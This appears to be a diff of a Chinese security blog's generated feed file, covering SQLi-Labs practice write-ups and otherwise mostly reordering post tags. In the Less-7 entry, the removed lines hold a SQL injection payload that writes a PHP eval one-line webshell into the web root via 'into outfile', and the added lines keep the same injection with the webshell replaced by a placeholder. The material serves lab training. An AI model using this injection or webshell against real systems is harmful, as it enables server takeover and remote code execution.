@@ -179,8 +179,8 @@
 <img src="/2019/11/17/SQLi-Labs/timg17.PNG">
 
 <h2 id="Less7"><a href="#Less7" class="headerlink" title="Less7"></a>Less7</h2><p>less7的标题是这样描述的 dump into outfile 提示我们写入外部文件<br>需要利用数据库的into outfile 命令</p>
-<p>1、通过尝试发现是 ‘))闭合，然后用以下命令写入文件，并加入一句话木马</p>
-<p>?id=-1’))  union select 1,”<?php @eval($_POST['eval']);?>“,3 into outfile “D:\phpStudy\PHPTutorial\WWW\less7.php” –+</p>
+<p>1、通过尝试发现是 ‘))闭合，然后用以下命令写入文件，并加入一句话</p>
+<p>?id=-1’))  union select 1,”此处放入一句话”,3 into outfile “D:\phpStudy\PHPTutorial\WWW\less7.php” –+</p>
 <img src="/2019/11/17/SQLi-Labs/timg18.PNG">
 
 <p>完成后因为条件允许，所以可以去本地目录验证一下</p>
@@ -202,10 +202,10 @@
         <category>Web</category>
       </categories>
       <tags>
-        <tag>靶场练习</tag>
-        <tag>sql注入</tag>
-        <tag>Web渗透</tag>
         <tag>Web</tag>
+        <tag>靶场练习</tag>
+        <tag>Web渗透</tag>
+        <tag>sql注入</tag>
       </tags>
   </entry>
   <entry>
@@ -333,9 +333,9 @@ args_test : [&apos;hello world&apos;,&apos;123456&apos;,&apos;password&apos;]</c
         <category>Web</category>
       </categories>
       <tags>
+        <tag>Web</tag>
         <tag>靶场练习</tag>
         <tag>Web渗透</tag>
-        <tag>Web</tag>
         <tag>XSS</tag>
       </tags>
   </entry>
@@ -364,9 +364,9 @@ args_test : [&apos;hello world&apos;,&apos;123456&apos;,&apos;password&apos;]</c
         <category>Web</category>
       </categories>
       <tags>
+        <tag>Web</tag>
         <tag>靶场练习</tag>
         <tag>Web渗透</tag>
-        <tag>Web</tag>
         <tag>XSS</tag>
       </tags>
   </entry>
@@ -409,9 +409,9 @@ args_test : [&apos;hello world&apos;,&apos;123456&apos;,&apos;password&apos;]</c
         <category>Web</category>
       </categories>
       <tags>
+        <tag>Web</tag>
         <tag>靶场练习</tag>
         <tag>Web渗透</tag>
-        <tag>Web</tag>
         <tag>XSS</tag>
       </tags>
   </entry>
@@ -448,10 +448,10 @@ args_test : [&apos;hello world&apos;,&apos;123456&apos;,&apos;password&apos;]</c
         <category>Web</category>
       </categories>
       <tags>
-        <tag>靶场练习</tag>
-        <tag>sql注入</tag>
-        <tag>Web渗透</tag>
         <tag>Web</tag>
+        <tag>靶场练习</tag>
+        <tag>Web渗透</tag>
+        <tag>sql注入</tag>
       </tags>
   </entry>
   <entry>
@@ -485,10 +485,10 @@ args_test : [&apos;hello world&apos;,&apos;123456&apos;,&apos;password&apos;]</c
         <category>Web</category>
       </categories>
       <tags>
-        <tag>靶场练习</tag>
-        <tag>sql注入</tag>
-        <tag>Web渗透</tag>
         <tag>Web</tag>
+        <tag>靶场练习</tag>
+        <tag>Web渗透</tag>
+        <tag>sql注入</tag>
       </tags>
   </entry>
   <entry>
@@ -537,10 +537,10 @@ args_test : [&apos;hello world&apos;,&apos;123456&apos;,&apos;password&apos;]</c
         <category>Web</category>
       </categories>
       <tags>
-        <tag>靶场练习</tag>
-        <tag>sql注入</tag>
-        <tag>Web渗透</tag>
         <tag>Web</tag>
+        <tag>靶场练习</tag>
+        <tag>Web渗透</tag>
+        <tag>sql注入</tag>
       </tags>
   </entry>
   <entry>
@@ -823,9 +823,9 @@ myqr.run(
         <category>Web</category>
       </categories>
       <tags>
-        <tag>sql注入</tag>
-        <tag>Web渗透</tag>
         <tag>Web</tag>
+        <tag>Web渗透</tag>
+        <tag>sql注入</tag>
         <tag>XSS</tag>
       </tags>
   </entry>
